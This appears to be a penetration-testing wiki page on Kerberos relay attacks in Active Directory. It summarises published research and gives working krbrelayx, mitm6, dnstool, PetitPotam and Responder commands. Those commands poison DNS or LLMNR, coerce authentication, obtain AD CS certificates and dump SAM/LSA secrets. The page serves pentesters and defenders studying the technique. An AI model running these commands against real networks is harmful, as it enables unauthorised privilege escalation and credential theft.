---
description: MITRE ATT&CK™ Sub-technique T1557.001
authors: BlWasp
category: ad
---

# Kerberos relay

## Theory

Under certain conditions, an attacker can relay Kerberos authentication to targets of his choosing. Depending on the mitigations in place, he will be able to move laterally and escalate privileges within an Active Directory domain. It is essential to have a good understanding of [the basic operation of the Kerberos protocol](index.md) in order to understand relay attacks on it.

The aim is to relay an `AP-REQ` message (service access request with a Service Ticket), initiated by a client for one service, to another service. However, there is one crucial prerequisite: **the targeted service and client must not apply encryption or signing**, as we do not possess the secret (the session key) needed to perform these operations, as in the case of an [NTLM relay](../ntlm/relay.md#Session-signing) attack.

Furthermore, an `AP-REQ` message cannot be relayed **to a service running under a different identity to the one initially requested by the client**. So for the attack to succeed, we need to force the client to generate an `AP-REQ` for the target host and send it to us.

In Active Directory, the `CLASS` of the SPN (HTTP, CIFS, HOST, and so on) doesn't matter most of the time. This is because Windows services only check whether they can decrypt the ST transmitted via the `AP-REQ`, but do not check the class of service for which the ST was issued. Therefore, if a single account implements different services with different classes of service, this means that an ST issued for one class of service can be used to access all the other services running under the same account's identity.

## Practice

Kerberos relay attacks are not as permissive as their NTLM versions. For the moment, only a few specific exploitation scenarios have been proven.

In particular, it is important to note that, due to stricter configuration of exchange signatures (particularly for the HTTP protocol), relays to the LDAP service are, for the time being, virtually impossible by default.

> [!TIP]
> For these reasons, Kerberos relay has no direct advantage over NTLM relay. Its advantage lies more in the fact that NTLM authentication can sometimes be disabled on the Active Directory domain, that the target service of the relay can only authorises Kerberos (for example, in the case of an [AD CS web enrolment service](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8) that has been hardened), or that the client belongs to the [Protected Users group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group).

[krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python) and [KrbRelayEx](https://github.com/decoder-it/KrbRelayEx) (C#) are great tools for relaying Kerberos authentications. Those tools setup relay clients and relay servers waiting for incoming authentications.

### Abuse from DNS poisoning

Dirk-jan Mollema has demonstrated in [this blog post](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6) that combining its [mitm6](https://github.com/dirkjanm/mitm6) (Python) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python) tools, and DNS *Start Of Authority* (**SOA**) requests, it is possible to poison a client and force it to send an `AP-REQ` message for an arbitrary service, which can then be relayed. The following section is a summary of his blog post, and of James Forshaw's [original article](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html).

> The DNS 'start of authority' (SOA) record stores important information about a domain or zone such as the email address of the administrator, when the domain was last updated, and how long the server should wait between refreshes.
>
> All DNS zones need an SOA record in order to conform to IETF standards. SOA records are also important for zone transfers.
>  
> _(Cloudflare, [source](https://www.cloudflare.com/learning/dns/dns-records/dns-soa-record/))_

An interesting service for relaying authentications is the AD CS HTTP service, which by default is vulnerable to relay attacks as it does not enforce signing with HTTP, allowing an [ESC8](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8) to be exploited via Kerberos from a [mitm6 DNS poisoning](../mitm-and-coerced-authentications/dhcpv6-spoofing.md).

DNS is used in Kerberos authentication operations in Active Directory. In particular, it is used through [Secure dynamic updates](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/configure-dns-dynamic-updates-windows-server-2003), which are used to keep DNS records synchronised with the IP addresses of dynamically addressed clients.

To summarise, the steps involved in such an exchange are as follows:

> 1. The client queries for the Start Of Authority (SOA) record for it’s name, which indicates which server is authoritative for the domain the client is in.
> 2. The server responds with the DNS server that is authorative, in this case the DC icorp-dc.internal.corp.
> 3. The client attempts a dynamic update on the A record with their name in the zone internal.corp.
> 4. This dynamic update is refused by the server because no authentication is provided.
> 5. The client uses a TKEY query to negotiate a secret key for authenticated queries.
> 6. The server answers with a TKEY Resource Record, which completes the authentication.
> 7. The client sends the dynamic update again, but now accompanied by a TSIG record, which is a signature using the key established in steps 5 and 6.
> 8. The server acknowledges the dynamic update. The new DNS record is now in place.
>
> _(Dirk-jan Mollema, February 22, 2022, [source](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/))_

During the `TKEY` request, Kerberos authentication takes place via `AP-REQ` and `AP-REP` requests. It is the `AP-REP` response that contains the session key then used to sign the exchanges. By advertising itself as a DNS server on the network, one can obtain Kerberos authentication from clients wishing to update their record by intercepting their initial `SOA` request. This is what [mitm6](https://github.com/dirkjanm/mitm6) does by default. 

As the DNS is usually on the domain controller, the Kerberos tickets obtained will be valid for services on the DC, the account name being the same. However, the `TKEY` request asks for the exchanges to be signed. A relay to LDAP/S is therefore impossible, as the latter will automatically set up the signature. Furthermore, as the SPN requested is `DNS`, this also limits the possibilities. However:

* The HTTP/S services [from AD CS](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8) and [SCCM](../sccm-mecm/privilege-escalation.md) can be very good targets as HTTP does not expect a request for a signature.
* Many services are actually mapped to the `HOST` service, and this is the case with `DNS`. So any host with a `HOST` service becomes valid.

Here are the steps to follow to set up a Kerberos relay using IPv6 DNS poisoning:

1. First, configure [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python), specifying the AD CS host as the target, and specifying the IPv4 address of the interface connected to the network, as the interface to bind the DNS server. 
2. Then configure [mitm6](https://github.com/dirkjanm/mitm6) (Python), using the AD CS host name as the relay target.
3. During the poisoning, the victim will attempt to modify its DNS record, which will be refused, and will then authenticate itself via Kerberos.
4. The client establishes a TCP connection with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python), and sends a `TKEY` request containing the Kerberos ticket.
4. Authentication is then relayed to AD CS.

```bash
# In a first terminal, waiting for an authentication to relay
krbrelayx.py --target http://$ADCS_FQDN/certsrv/ -ip $ATTACKER_IP --victim $TARGET_SAMNAME --adcs --template Machine

# In a second terminal, poisoning the victim
mitm6 -i $ATTACKER_IP -d $DOMAIN -hw $TARGET_FQDN --relay $ADCS_FQDN -v
```

### Abuse from a coerced authentication

As demonstrated by Synacktiv in [this blog post](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx), it is also possible to relay a Kerberos authentication from, and to, unsigned SMB services, when it comes [from a coercion](../mitm-and-coerced-authentications/index.md).

When an SMB client builds the SPN from the service class and its name, the `SecMakeSPNEx2` method is called, which calls the `CredMarshalTargetInfo` API function. This API takes a list of target information in a `CREDENTIAL_TARGET_INFORMATION` structure, *marshalizes* it in Base64, and appends it to the end of the actual SPN.

For the hostname `target` and the class of service `cifs`, the returned SPN will look like :

```
cifs/target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA
```

So, if an attacker registers the DNS record `target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA`, the client will be able to request a ticket for `cifs/target`, but will connect to `target1UWhRCAAAAAAAAAAUAAAAAAAAAAAAAAAAAAAAAtargetsBAAAA`. By default, any authenticated user is allowed to create [new DNS records in the ADIDNS](../mitm-and-coerced-authentications/adidns-spoofing.md).

In his [original article](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html), James Forshaw notes this point:

> Another issue is that the size limit of a single name in DNS is 63 characters. The minimum valid marshaled buffer is 44 characters long leaving only 19 characters for the SPN part. This is at least larger than the minimum NetBIOS name limit of 15 characters so as long as there's an SPN for that shorter name registered it should be sufficient. However if there's no short SPN name registered, then it's going to be more difficult to exploit.
>
> _(James Forshaw, October 20, 2021, [source](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html))_

It is therefore necessary to restrict the content of the `CREDENTIAL_TARGET_INFORMATION` structure as much as possible. The minimal `CREDENTIAL_TARGET_INFORMATION` structure contains `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`.

1. First of all, register the specific DNS record (the NetBIOS being that of **the machine which is going to receive the relay**, for example the PKI, and not the one which will be coerced). This can be performed with [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) (Python):

```bash
dnstool.py -u "$DOMAIN\\$USERNAME" -p "$PASSWORD" -r "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" -d "$ATTACKER_IP" --action add "$DC_IP" --tcp
```

2. Then, trigger an authentication coerce (for example, with [PetitPotam](../mitm-and-coerced-authentications/ms-efsr.md)) from the target to the DNS record, and relay the authentication with [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python). For example, here to the [PKI HTTP endpoint](../adcs/unsigned-endpoints.md#Web-endpoint-ESC8):

```bash
# In a first terminal, krbrelayx waiting for an authentication to relay
krbrelayx.py -t 'http://$ADCS_FQDN/certsrv/certfnsh.asp' --adcs --template DomainController -v '$RELAYED_TARGET_SAMNAME'

# In a second terminal, coerce the victim authentication to the DNS record
Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD "[ADCS_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" $TARGET_IP
```

In the case where the target of the relay (**the machine receiving the relay**) is an unsigned SMB service, and the authentication obtained is privileged, the following command will [dump the SAM and the LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md):

```bash
krbrelayx.py -t smb://$TARGET_FQDN
```

### Abuse from multicast poisoning

When a web server requests Kerberos authentication, it does not use the destination URL to determine the SPN for which an ST is to be retrieved, but rather the response name of the DNS response. Nominally, these two elements should coincide. The client accesses a login URL, performs the DNS query for the server's FQDN, then performs the ST request from the DNS response, and constructs the `AP-REQ`.

However, an attacker in a Man-in-the-Middle position can poison the DNS response and indicate that the HTTP server's FQDN points to him. In this way, the victim will obtain an ST for the server, construct the `AP-REQ`, and send it to the attacker. This is the attack Synacktiv has demonstrated in [this article](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with).

> [!NOTE]
> Note that the technique will not work for SMB clients, because it is not possible to opportunistically respond via LLMNR to non-existent hostnames in SMB with a response name containing a `CREDENTIAL_TARGET_INFORMATION` structure. This structure is explained [in the previous section](relay.md#Abuse-from-a-coerced-authentication).
>
> > Another limitation is that, according to our tests, other local name resolution protocols such as mDNS and NBTNS cannot be abused to carry out the attack. Indeed, while LLMNR responses contain both the query sent by the client and the response, this is not the case of mDNS and NBTNS, which only contain responses.[...]
> >
> > Because mDNS and NBTNS only contain name resolution responses, changing the answer name will actually confuse the HTTP clients, which will not be able to make the connection between the query they sent, and the modified response.
> >
> > _(Quentin Roland, January 27, 2025, [source](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with))_
>
> Finally, most HTTP clients use the Kerberos `Negociate` package, which forces the signature to be set up. This means that even HTTP authentication cannot be relayed to LDAP.

Here are the different steps to perform the attack:

1. Set up an [LLMNR poisoner](../mitm-and-coerced-authentications/llmnr-nbtns-mdns-spoofing.md), for example with [Responder](https://github.com/lgandx/Responder) (Python).
2. An HTTP client fails to resolve a hostname, for any reason.
3. The LLMNR poisoner poisons the victim, and indicates that the hostname resolves to the attacker's machine. **In the LLMNR response, the response name differs from the request and corresponds to an arbitrary relay target.**
4. The victim makes a request to the attacker's web server, which requires Kerberos authentication.
5. The victim requests an ST with the SPN of the relay target indicated in the LLMNR response, and sends the `AP-REQ` to the attacker's web server.
6. The attacker extracts the `AP-REQ` and forwards it to a service of the relay target.

First, run [Responder](https://github.com/lgandx/Responder) (Python) with the `-N` option, *which allows to spoof the answer name returned by LLMNR responses when poisoning a client*:

```bash
python3 Responder.py -I $INTERFACE -N $RELAY_TARGET_NETBIOSNAME
```

When a request for LLMNR resolution arrives, Responder will reply with the target indicated, pointing to the attacker machine. [krbrelayx](https://github.com/dirkjanm/krbrelayx) (Python) can be used to actually perform the Kerberos relay:

```bash
python3 krbrelayx.py --target 'http://$ADCS_FQDN/certsrv/' -ip $ATTACKER_IP --adcs --template User
```

This attack can also work by forcing [a WebDAV authentication](../mitm-and-coerced-authentications/webclient.md) to a record that does not exist. The absence of a DNS record will generate an LLMNR fallback, leading to the same result.

## Resources

[https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)

[https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6)

[https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx)

[https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with](https://www.synacktiv.com/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with)
